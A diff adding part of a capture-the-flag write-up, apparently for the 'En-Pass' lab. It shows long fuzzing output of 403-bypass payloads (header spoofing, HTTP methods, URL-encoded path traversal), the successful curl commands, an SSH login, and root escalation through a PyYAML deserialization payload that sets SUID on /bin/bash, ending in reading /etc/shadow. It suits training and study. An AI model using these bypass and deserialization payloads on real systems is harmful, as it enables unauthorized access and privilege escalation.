@@ -623,3 +623,629 @@ exploit
 ----------------------
 X-Originally-Forwarded-For Payload: Status: 403, Length : 1123 
 X-Originating-  Payload: Status: 403, Length : 1123 
+X-Originating-IP Payload: Status: 403, Length : 1123 
+True-Client-IP Payload: Status: 403, Length : 1123 
+X-WAP-Profile Payload: Status: 403, Length : 1123 
+From Payload: Status: 403, Length : 1123 
+Profile http:// Payload: Status: 403, Length : 1123 
+X-Arbitrary http:// Payload: Status: 403, Length : 1123 
+X-HTTP-DestinationURL http:// Payload: Status: 403, Length : 1123 
+X-Forwarded-Proto http:// Payload: Status: 403, Length : 1123 
+Destination Payload: Status: 403, Length : 1123 
+Proxy Payload: Status: 403, Length : 1123 
+CF-Connecting_IP: Status: 403, Length : 1123 
+CF-Connecting-IP: Status: 403, Length : 1123 
+Referer Payload: Status: 403, Length : 1123 
+X-Custom-IP-Authorization Payload: Status: 403, Length : 1123 
+X-Custom-IP-Authorization..;/ Payload Status: 404, Length : 277 
+X-Originating-IP Payload: Status: 403, Length : 1123 
+X-Forwarded-For Payload: Status: 403, Length : 1123 
+X-Remote-IP Payload: Status: 403, Length : 1123 
+X-Client-IP Payload: Status: 403, Length : 1123 
+X-Host Payload Status: 403, Length : 1123 
+X-Forwarded-Host Payload: Status: 403, Length : 1123 
+X-Original-URL Payload: Status: 403, Length : 1123 
+X-Rewrite-URL Payload: Status: 403, Length : 1123 
+Content-Length Payload: Status: 403, Length : 1123 
+X-ProxyUser-Ip Payload: Status: 403, Length : 1123 
+Base-Url Payload: Status: 403, Length : 1123 
+Client-IP Payload: Status: 403, Length : 1123 
+Http-Url Payload: Status: 403, Length : 1123 
+Proxy-Host Payload: Status: 403, Length : 1123 
+Proxy-Url Payload: Status: 403, Length : 1123 
+Real-Ip Payload: Status: 403, Length : 1123 
+Redirect Payload: Status: 403, Length : 1123 
+Referrer Payload: Status: 403, Length : 1123 
+Request-Uri Payload: Status: 403, Length : 1123 
+Uri Payload: Status: 403, Length : 1123 
+Url Payload: Status: 403, Length : 1123 
+X-Forward-For Payload: Status: 403, Length : 1123 
+X-Forwarded-By Payload: Status: 403, Length : 1123 
+X-Forwarded-For-Original Payload: Status: 403, Length : 1123 
+X-Forwarded-Server Payload: Status: 403, Length : 1123 
+X-Forwarded Payload: Status: 403, Length : 1123 
+X-Forwarder-For Payload: Status: 403, Length : 1123 
+X-Http-Destinationurl Payload: Status: 403, Length : 1123 
+X-Http-Host-Override Payload: Status: 403, Length : 1123 
+X-Original-Remote-Addr Payload: Status: 403, Length : 1123 
+X-Proxy-Url Payload: Status: 403, Length : 1123 
+X-Real-Ip Payload: Status: 403, Length : 1123 
+X-Remote-Addr Payload: Status: 403, Length : 1123 
+X-OReferrer Payload: Status: 403, Length : 1123 
+-------------------------
+[+] Protocol Based Bypass
+-------------------------
+HTTP Scheme Payload: Status: 403, Length : 1123 
+HTTPs Scheme Payload: Status: 000, Length : 0 
+X-Forwarded-Scheme HTTP Payload: Status: 403, Length : 1123 
+X-Forwarded-Scheme HTTPs Payload: Status: 403, Length : 1123 
+-------------------------
+[+] Port Based Bypass
+-------------------------
+X-Forwarded-Port 443 Payload: Status: 403, Length : 1123 
+X-Forwarded-Port 4443 Payload: Status: 403, Length : 1123 
+X-Forwarded-Port 80 Payload: Status: 403, Length : 1123 
+X-Forwarded-Port 8080 Payload: Status: 403, Length : 1123 
+X-Forwarded-Port 8443 Payload: Status: 403, Length : 1123 
+----------------------
+[+] HTTP Method Bypass
+----------------------
+GET :  Status: 403, Length : 1123 
+POST :  Status: 403, Length : 1123 
+HEAD : Status: 403, Length : 0 
+OPTIONS :  Status: 403, Length : 1123 
+PUT :  Status: 403, Length : 1123 
+TRACE :  Status: 405, Length : 303 
+PATCH :  Status: 403, Length : 1123 
+TRACK :  Status: 403, Length : 1123 
+CONNECT :  Status: 400, Length : 313 
+UPDATE :  Status: 403, Length : 1123 
+LOCK :  Status: 403, Length : 1123 
+----------------------
+[+] URL Encode Bypass 
+----------------------
+Payload [ #? ]: Status: 403, Length : 1123 
+Payload [ %09 ]: Status: 404, Length : 277 
+Payload [ %09%3b ]: Status: 404, Length : 277 
+Payload [ %09.. ]: Status: 404, Length : 277 
+Payload [ %09; ]: Status: 404, Length : 277 
+Payload [ %20 ]: Status: 404, Length : 277 
+Payload [ %23%3f ]: Status: 404, Length : 277 
+Payload [ %252f%252f ]: Status: 404, Length : 277 
+Payload [ %252f/ ]: Status: 404, Length : 277 
+Payload [ %2e%2e ]: Status: 404, Length : 277 
+Payload [ %2e%2e/ ]: Status: 404, Length : 277 
+Payload [ %2f ]: Status: 404, Length : 277 
+Payload [ %2f%20%23 ]: Status: 404, Length : 277 
+Payload [ %2f%23 ]: Status: 404, Length : 277 
+Payload [ %2f%2f ]: Status: 404, Length : 277 
+Payload [ %2f%3b%2f ]: Status: 404, Length : 277 
+Payload [ %2f%3b%2f%2f ]: Status: 404, Length : 277 
+Payload [ %2f%3f ]: Status: 404, Length : 277 
+Payload [ %2f%3f/ ]: Status: 404, Length : 277 
+Payload [ %2f/ ]: Status: 404, Length : 277 
+Payload [ %3b ]: Status: 404, Length : 277 
+Payload [ %3b%09 ]: Status: 404, Length : 277 
+Payload [ %3b%2f%2e%2e ]: Status: 404, Length : 277 
+Payload [ %3b%2f%2e%2e%2f%2e%2e%2f%2f ]: Status: 404, Length : 277 
+Payload [ %3b%2f%2e. ]: Status: 404, Length : 277 
+Payload [ %3b%2f.. ]: Status: 404, Length : 277 
+Payload [ %3b/%2e%2e/..%2f%2f ]: Status: 404, Length : 277 
+Payload [ %3b/%2e. ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php%3b/%2e.' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ %3b/%2f%2f../ ]: Status: 404, Length : 277 
+Payload [ %3b/.. ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php%3b/..' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ %3b//%2f../ ]: Status: 404, Length : 277 
+Payload [ %3f%23 ]: Status: 404, Length : 277 
+Payload [ %3f%3f ]: Status: 404, Length : 277 
+Payload [ .. ]: Status: 404, Length : 277 
+Payload [ ..%00/; ]: Status: 404, Length : 277 
+Payload [ ..%00;/ ]: Status: 404, Length : 277 
+Payload [ ..%09 ]: Status: 404, Length : 277 
+Payload [ ..%0d/; ]: Status: 404, Length : 277 
+Payload [ ..%0d;/ ]: Status: 404, Length : 277 
+Payload [ ..%5c/ ]: Status: 404, Length : 277 
+Payload [ ..%ff/; ]: Status: 404, Length : 277 
+Payload [ ..%ff;/ ]: Status: 404, Length : 277 
+Payload [ ..;%00/ ]: Status: 404, Length : 277 
+Payload [ ..;%0d/ ]: Status: 404, Length : 277 
+Payload [ ..;%ff/ ]: Status: 404, Length : 277 
+Payload [ ..;\ ]: Status: 404, Length : 277 
+Payload [ ..;\; ]: Status: 404, Length : 277 
+Payload [ ..\; ]: Status: 404, Length : 277 
+Payload [ /%20# ]: Status: 403, Length : 1123 
+Payload [ /%20%23 ]: Status: 403, Length : 1123 
+Payload [ /%252e%252e%252f/ ]: Status: 403, Length : 1123 
+Payload [ /%252e%252e%253b/ ]: Status: 403, Length : 1123 
+Payload [ /%252e%252f/ ]: Status: 403, Length : 1123 
+Payload [ /%252e%253b/ ]: Status: 403, Length : 1123 
+Payload [ /%252e/ ]: Status: 403, Length : 1123 
+Payload [ /%252f ]: Status: 403, Length : 1123 
+Payload [ /%2e%2e ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/%2e%2e' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /%2e%2e%3b/ ]: Status: 403, Length : 1123 
+Payload [ /%2e%2e/ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/%2e%2e/' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /%2e%2f/ ]: Status: 404, Length : 277 
+Payload [ /%2e%3b/ ]: Status: 403, Length : 1123 
+Payload [ /%2e%3b// ]: Status: 403, Length : 1123 
+Payload [ /%2e/ ]: Status: 403, Length : 1123 
+Payload [ /%2e// ]: Status: 403, Length : 1123 
+Payload [ /%2f ]: Status: 404, Length : 277 
+Payload [ /%3b/ ]: Status: 403, Length : 1123 
+Payload [ /.. ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /..%2f ]: Status: 404, Length : 277 
+Payload [ /..%2f..%2f ]: Status: 404, Length : 277 
+Payload [ /..%2f..%2f..%2f ]: Status: 404, Length : 277 
+Payload [ /../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /../../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /../../../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../../../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /../../..// ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../../..//' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /../..// ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../..//' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /../..//../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../..//../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /../..;/ ]: Status: 404, Length : 277 
+Payload [ /.././../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/.././../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /../.;/../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../.;/../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /..// ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..//' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /..//../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..//../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /..//../../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..//../../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /..//..;/ ]: Status: 404, Length : 277 
+Payload [ /../;/ ]: Status: 404, Length : 277 
+Payload [ /../;/../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/../;/../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /..;%2f ]: Status: 404, Length : 277 
+Payload [ /..;%2f..;%2f ]: Status: 404, Length : 277 
+Payload [ /..;%2f..;%2f..;%2f ]: Status: 404, Length : 277 
+Payload [ /..;/../ ]: Status: 403, Length : 1123 
+Payload [ /..;/..;/ ]: Status: 403, Length : 1123 
+Payload [ /..;// ]: Status: 403, Length : 1123 
+Payload [ /..;//../ ]: Status: 200, Length : 917  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..;//../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ /..;//..;/ ]: Status: 403, Length : 1123 
+Payload [ /..;/;/ ]: Status: 403, Length : 1123 
+Payload [ /..;/;/..;/ ]: Status: 403, Length : 1123 
+Payload [ /.// ]: Status: 403, Length : 1123 
+Payload [ /.;/ ]: Status: 403, Length : 1123 
+Payload [ /.;// ]: Status: 403, Length : 1123 
+Payload [ //.. ]: Status: 403, Length : 1123 
+Payload [ //../../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php//../../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ //..; ]: Status: 403, Length : 1123 
+Payload [ //./ ]: Status: 403, Length : 1123 
+Payload [ //.;/ ]: Status: 403, Length : 1123 
+Payload [ ///.. ]: Status: 403, Length : 1123 
+Payload [ ///../ ]: Status: 403, Length : 1123 
+Payload [ ///..// ]: Status: 403, Length : 1123 
+Payload [ ///..; ]: Status: 403, Length : 1123 
+Payload [ ///..;/ ]: Status: 403, Length : 1123 
+Payload [ ///..;// ]: Status: 403, Length : 1123 
+Payload [ //;/ ]: Status: 403, Length : 1123 
+Payload [ /;/ ]: Status: 403, Length : 1123 
+Payload [ /;// ]: Status: 403, Length : 1123 
+Payload [ /;x ]: Status: 403, Length : 1123 
+Payload [ /;x/ ]: Status: 403, Length : 1123 
+Payload [ /x/../ ]: Status: 403, Length : 1123 
+Payload [ /x/..// ]: Status: 403, Length : 1123 
+Payload [ /x/../;/ ]: Status: 403, Length : 1123 
+Payload [ /x/..;/ ]: Status: 403, Length : 1123 
+Payload [ /x/..;// ]: Status: 403, Length : 1123 
+Payload [ /x/..;/;/ ]: Status: 403, Length : 1123 
+Payload [ /x//../ ]: Status: 403, Length : 1123 
+Payload [ /x//..;/ ]: Status: 403, Length : 1123 
+Payload [ /x/;/../ ]: Status: 403, Length : 1123 
+Payload [ /x/;/..;/ ]: Status: 403, Length : 1123 
+Payload [ ; ]: Status: 404, Length : 277 
+Payload [ ;%09 ]: Status: 404, Length : 277 
+Payload [ ;%09.. ]: Status: 404, Length : 277 
+Payload [ ;%09..; ]: Status: 404, Length : 277 
+Payload [ ;%09; ]: Status: 404, Length : 277 
+Payload [ ;%2F.. ]: Status: 404, Length : 277 
+Payload [ ;%2f%2e%2e ]: Status: 404, Length : 277 
+Payload [ ;%2f%2e%2e%2f%2e%2e%2f%2f ]: Status: 404, Length : 277 
+Payload [ ;%2f%2f/../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;%2f%2f/../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;%2f.. ]: Status: 404, Length : 277 
+Payload [ ;%2f..%2f%2e%2e%2f%2f ]: Status: 404, Length : 277 
+Payload [ ;%2f..%2f..%2f%2f ]: Status: 404, Length : 277 
+Payload [ ;%2f..%2f/ ]: Status: 404, Length : 277 
+Payload [ ;%2f..%2f/..%2f ]: Status: 404, Length : 277 
+Payload [ ;%2f..%2f/../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;%2f..%2f/../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;%2f../%2f..%2f ]: Status: 404, Length : 277 
+Payload [ ;%2f../%2f../ ]: Status: 404, Length : 277 
+Payload [ ;%2f..//..%2f ]: Status: 404, Length : 277 
+Payload [ ;%2f..//../ ]: Status: 404, Length : 277 
+Payload [ ;%2f../// ]: Status: 404, Length : 277 
+Payload [ ;%2f..///; ]: Status: 404, Length : 277 
+Payload [ ;%2f..//;/ ]: Status: 404, Length : 277 
+Payload [ ;%2f..//;/; ]: Status: 404, Length : 277 
+Payload [ ;%2f../;// ]: Status: 404, Length : 277 
+Payload [ ;%2f../;/;/ ]: Status: 404, Length : 277 
+Payload [ ;%2f../;/;/; ]: Status: 404, Length : 277 
+Payload [ ;%2f..;/// ]: Status: 404, Length : 277 
+Payload [ ;%2f..;//;/ ]: Status: 404, Length : 277 
+Payload [ ;%2f..;/;// ]: Status: 404, Length : 277 
+Payload [ ;%2f/%2f../ ]: Status: 404, Length : 277 
+Payload [ ;%2f//..%2f ]: Status: 404, Length : 277 
+Payload [ ;%2f//../ ]: Status: 404, Length : 277 
+Payload [ ;%2f//..;/ ]: Status: 404, Length : 277 
+Payload [ ;%2f/;/../ ]: Status: 404, Length : 277 
+Payload [ ;%2f/;/..;/ ]: Status: 404, Length : 277 
+Payload [ ;%2f;//../ ]: Status: 404, Length : 277 
+Payload [ ;%2f;/;/..;/ ]: Status: 404, Length : 277 
+Payload [ ;/%2e%2e ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/%2e%2e' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/%2e%2e%2f%2f ]: Status: 404, Length : 277 
+Payload [ ;/%2e%2e%2f/ ]: Status: 404, Length : 277 
+Payload [ ;/%2e%2e/ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/%2e%2e/' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/%2e. ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/%2e.' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/%2f%2f../ ]: Status: 404, Length : 277 
+Payload [ ;/%2f/..%2f ]: Status: 404, Length : 277 
+Payload [ ;/%2f/../ ]: Status: 404, Length : 277 
+Payload [ ;/.%2e ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/.%2e' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/.%2e/%2e%2e/%2f ]: Status: 404, Length : 277 
+Payload [ ;/.. ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/..' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/..%2f ]: Status: 404, Length : 277 
+Payload [ ;/..%2f%2f../ ]: Status: 404, Length : 277 
+Payload [ ;/..%2f..%2f ]: Status: 404, Length : 277 
+Payload [ ;/..%2f/ ]: Status: 404, Length : 277 
+Payload [ ;/..%2f// ]: Status: 404, Length : 277 
+Payload [ ;/../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/../%2f/ ]: Status: 404, Length : 277 
+Payload [ ;/../../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/../../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/../..// ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/../..//' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/.././../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/.././../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/../.;/../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/../.;/../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/..// ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/..//' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/..//%2e%2e/ ]: Status: 400, Length : 307 
+Payload [ ;/..//%2f ]: Status: 404, Length : 277 
+Payload [ ;/..//../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/..//../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/../// ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/..///' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/../;/ ]: Status: 404, Length : 277 
+Payload [ ;/../;/../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;/../;/../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;/..; ]: Status: 404, Length : 277 
+Payload [ ;/.;. ]: Status: 404, Length : 277 
+Payload [ ;//%2f../ ]: Status: 404, Length : 277 
+Payload [ ;//.. ]: Status: 404, Length : 277 
+Payload [ ;//../../ ]: Status: 200, Length : 2563  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php;//../../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+Payload [ ;///.. ]: Status: 404, Length : 277 
+Payload [ ;///../ ]: Status: 404, Length : 277 
+Payload [ ;///..// ]: Status: 404, Length : 277 
+Payload [ ;x ]: Status: 404, Length : 277 
+Payload [ ;x/ ]: Status: 404, Length : 277 
+Payload [ ;x; ]: Status: 404, Length : 277 
+Payload [ & ]:  Status: 404, Length : 277 
+Payload [ % ]: Status: 400, Length : 307 
+Payload [ %09 ]: Status: 404, Length : 277 
+Payload [ ../ ]: Status: 404, Length : 277 
+Payload [ ../%2f ]: Status: 404, Length : 277 
+Payload [ .././ ]: Status: 404, Length : 277 
+Payload [ ..%00/ ]: Status: 404, Length : 277 
+Payload [ ..%0d/ ] Status: 404, Length : 277 
+Payload [ ..%5c ]: Status: 404, Length : 277 
+Payload [ ..\ ]: Status: 404, Length : 277 
+Payload [ ..%ff/ ]: Status: 404, Length : 277 
+Payload [ %2e%2e%2f ]: Status: 404, Length : 277 
+Payload [ .%2e/ ]: Status: 404, Length : 277 
+Payload [ %3f ]: Status: 404, Length : 277 
+Payload [ %26 ]: Status: 404, Length : 277 
+Payload [ %23 ]: Status: 404, Length : 277 
+Payload [ %2e ]: Status: 404, Length : 277 
+Payload [ /. ]: Status: 403, Length : 1123 
+Payload [ ? ]: Status: 403, Length : 1123 
+Payload [ ?? ]: Status: 403, Length : 1123 
+Payload [ ??? ]: Status: 403, Length : 1123 
+Payload [ // ]: Status: 403, Length : 1123 
+Payload [ /./ ]: Status: 403, Length : 1123 
+Payload [ .//./ ]: Status: 404, Length : 277 
+Payload [ //?anything ]: Status: 403, Length : 1123 
+Payload [ # ]: Status: 403, Length : 1123 
+Payload [ / ]: Status: 403, Length : 1123 
+Payload [ /.randomstring ]: Status: 403, Length : 1123 
+Payload [ ..;/ ]: Status: 404, Length : 277 
+Payload [ .html ]: Status: 404, Length : 277 
+Payload [ %20/ ]: Status: 404, Length : 277 
+Payload: [ %20403.php%20/ ]: Status: 403, Length : 1123 
+Payload [ .json ]: Status: 404, Length : 277 
+Payload [ \..\.\ ]:^C
+
+but always look length 
+
+Payload [ /..;//../ ]: Status: 200, Length : 917  👌
+╭────────────────────────────────────────────────────────────────────╮
+ ╰─> PAYLOAD : curl -k -s 'http://10.10.219.232:8001/403.php/..;//../' -H 'User-Agent: Mozilla/5.0'
+╰────────────────────────────────────────────────────────────────────╯
+
+┌──(witty㉿kali)-[~/bug_hunter/4-ZERO-3]
+└─$ curl -k -s 'http://10.10.219.232:8001/403.php/..;//../' -H 'User-Agent: Mozilla/5.0'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>En-Pass</title>
+
+<style>
+    body{
+
+        background-color: #351d34;
+        margin: 0px;
+        padding: 0;
+    }
+
+.items{
+
+    display: flex;
+    justify-content: center;
+    text-align: center;
+    vertical-align: top;
+    flex-direction: column;
+
+}
+
+h1{
+
+    font-family: Verdana, Geneva, Tahoma, sans-serif;
+    color:wheat;
+
+}
+.txt{
+
+    margin-top: -80px;
+    font-size: 150px;
+    font-family: sans-serif;
+    color: rgb(240, 190, 190);
+
+}
+
+.txt2{
+    margin-top: -200px;
+    font-family: sans-serif;
+    color: rgb(240, 190, 190);
+
+}
+
+h3{
+
+    color:rgb(240, 190, 100);
+    font-size: 300px;
+
+}
+
+</style>
+
+</head>
+<body>           
+
+<h3>Glad to see you here.Congo, you bypassed it. 'imsau' is waiting for you somewhere.</h3>
+</body>
+</html> 
+
+so username: imsau
+pass: cimihan_are_you_here?
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh -i enpass_rsa imsau@10.10.219.232
+Enter passphrase for key 'enpass_rsa': 
+Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-201-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+1 package can be updated.
+1 of these updates is a security update.
+To see these additional updates run: apt list --upgradable
+```
+```text
+$ id
+uid=1002(imsau) gid=1002(imsau) groups=1002(imsau)
+```
+```text
+$ ls
+user.txt
+```
+```text
+$ cat user.txt	
+1c5ccb6ce6f3561e302e0e516c633da9
+```
+
+## Privilege Escalation
+```text
+$ /bin/bash
+imsau@enpass:/opt$ ls
+scripts
+imsau@enpass:/opt$ cd scripts/
+imsau@enpass:/opt/scripts$ ls
+file.py
+imsau@enpass:/opt/scripts$ cat file.py 
+#!/usr/bin/python
+import yaml
+
+class Execute():
+	def __init__(self,file_name ="/tmp/file.yml"):
+		self.file_name = file_name
+		self.read_file = open(file_name ,"r")
+
+	def run(self):
+		return self.read_file.read()
+
+data  = yaml.load(Execute().run())
+
+imsau@enpass:/opt/scripts$ ls -lah
+total 12K
+drwxr-xr-x 2 root root 4.0K Jan 31  2021 .
+drwxr-xr-x 3 root root 4.0K Jan 31  2021 ..
+-r-xr-xr-x 1 root root  250 Jan 31  2021 file.py
+
+https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation
+
+python -c 'import yaml; yaml.load("!!python/object/new:os.system [echo EXPLOIT!]")'
+
+imsau@enpass:/opt/scripts$ cd /tmp
+imsau@enpass:/tmp$ ls
+imsau@enpass:/tmp$ vim file.yml
+
+imsau@enpass:/tmp$ cat file.yml
+!!python/object/new:os.system [chmod u+s /bin/bash]
+
+This code will set SUID on /bin/bash when the cronjob is run
+
+imsau@enpass:/tmp$ ls -lah /bin/bash
+-rwsr-xr-x 1 root root 1014K Jul 12  2019 /bin/bash
+imsau@enpass:/tmp$ bash -p
+bash-4.3# cd /root
+bash-4.3# ls
+root.txt
+
+bash-4.3# cat root.txt
+5d45f08ee939521d59247233d3f8faf
+
+bash-4.3# cat /etc/shadow
